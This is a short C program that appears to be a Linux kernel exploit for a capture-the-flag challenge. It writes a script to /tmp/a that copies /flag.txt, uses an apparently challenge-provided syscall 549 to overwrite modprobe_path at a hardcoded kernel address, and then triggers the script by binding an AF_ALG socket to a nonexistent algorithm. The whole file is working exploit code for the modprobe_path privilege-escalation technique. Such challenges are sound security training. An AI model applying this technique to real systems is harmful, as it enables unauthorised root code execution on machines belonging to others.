#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <linux/if_alg.h>
#include <sys/mman.h>

// https://elixir.bootlin.com/linux/v6.14-rc1/source/crypto/af_alg.c#L148

int main(){

    system("echo -ne '#!/bin/sh\ncat /flag.txt > /tmp/flag' > /tmp/a");
    system("chmod a+x /tmp/a");

    unsigned long modprobepath = 0xffffffff82b45b20;
    printf("[!]modprobe_path: 0x%lx\n", modprobepath);
    syscall(549, modprobepath, "/tmp/a");

    struct sockaddr_alg sa;
    int alg_fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
    if (alg_fd < 0) {
            perror("socket(AF_ALG) failed");
            return 1;
    }

    memset(&sa, 0, sizeof(sa));
    sa.salg_family = AF_ALG;
    strcpy((char *)sa.salg_type, "Naup");
    bind(alg_fd, (struct sockaddr *)&sa, sizeof(sa));

    return 0;
}
